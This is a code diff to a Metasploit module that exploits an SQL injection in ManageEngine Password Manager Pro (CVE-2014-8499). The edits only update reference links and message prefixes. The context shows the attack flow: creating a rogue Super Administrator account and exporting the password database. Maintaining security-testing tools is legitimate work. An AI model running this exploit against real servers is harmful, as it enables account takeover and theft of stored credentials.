@@ -34,8 +34,8 @@ class Metasploit3 < Msf::Auxiliary
         [
           [ 'CVE', '2014-8499' ],
           [ 'OSVDB', '114485' ],
-          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/ManageEngine/me_pmp_privesc.txt' ],
-          [ 'URL', 'http://seclists.org/fulldisclosure/2014/Nov/18' ]
+          [ 'URL', 'http://seclists.org/fulldisclosure/2014/Nov/18' ],
+          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_pmp_privesc.txt' ],
         ],
       'DisclosureDate' => 'Nov 8 2014'))
 
@@ -221,7 +221,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def run
     unless check == Exploit::CheckCode::Appears
-      print_error("#{peer} - Fingerprint hasn't been successful, trying to exploit anyway...")
+      print_error("Fingerprint hasn't been successful, trying to exploit anyway...")
     end
 
     version = get_version
@@ -233,7 +233,7 @@ class Metasploit3 < Msf::Auxiliary
     creds = inject_sql(version < 7000 ? true : false)
     username = creds[0]
     password = creds[1]
-    print_good("#{peer} - Created a new Super Administrator with username: #{username} | password: #{password}")
+    print_good("Created a new Super Administrator with username: #{username} | password: #{password}")
 
     cookie_su = login(username, password)
 
@@ -241,10 +241,10 @@ class Metasploit3 < Msf::Auxiliary
       fail_with(Failure::NoAccess, "#{peer} - Failed to authenticate as Super Administrator, account #{username} might not work.")
     end
 
-    print_status("#{peer} - Reporting Super Administrator credentials...")
+    print_status("Reporting Super Administrator credentials...")
     report_super_admin_creds(username, password)
 
-    print_status("#{peer} - Leaking Password database...")
+    print_status("Leaking Password database...")
     loot_passwords(cookie_su)
   end
 
@@ -308,7 +308,7 @@ class Metasploit3 < Msf::Auxiliary
 
     if res && res.code == 200 && res.body && res.body.to_s.length > 0
       vprint_line(res.body.to_s)
-      print_good("#{peer} - Successfully exported password database from Password Manager Pro.")
+      print_good("Successfully exported password database from Password Manager Pro.")
       loot_name     = 'manageengine.passwordmanagerpro.password.db'
       loot_type     = 'text/csv'
       loot_filename = 'manageengine_pmp_password_db.csv'
@@ -320,9 +320,9 @@ class Metasploit3 < Msf::Auxiliary
           res.body,
           loot_filename,
           loot_desc)
-      print_status("#{peer} - Password database saved in: #{p}")
+      print_status("Password database saved in: #{p}")
     else
-      print_error("#{peer} - Failed to export Password Manager Pro passwords.")
+      print_error("Failed to export Password Manager Pro passwords.")
     end
   end
 end
